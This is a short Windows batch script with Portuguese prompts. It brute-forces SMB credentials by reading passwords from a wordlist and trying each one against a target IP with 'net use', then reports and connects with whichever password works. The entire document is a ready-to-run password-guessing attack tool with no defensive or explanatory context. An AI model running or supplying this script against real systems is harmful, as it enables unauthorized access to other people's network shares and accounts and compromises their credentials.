@echo off
set /p ip="Digite o endereço IP: "
set /p user="Digite o nome de usuário: "
set /p wordlist="Digite o nome do arquivo de lista de senhas: "

for /f %%a in (%wordlist%) do (
    set pass=%%a
    call :attempt
)

echo Senha não encontrada.
pause
exit /b

:success
echo Senha encontrada: %pass%
net use \\%ip% /user:%user% %pass% >nul 2>&1
if %errorlevel% EQU 0 (
    echo Conexão bem-sucedida.
) else (
    echo Falha na conexão.
)
pause
exit /b

:attempt
echo Tentando senha: %pass%
net use \\%ip% /user:%user% %pass% >nul 2>&1
if %errorlevel% EQU 0 goto success
exit /b
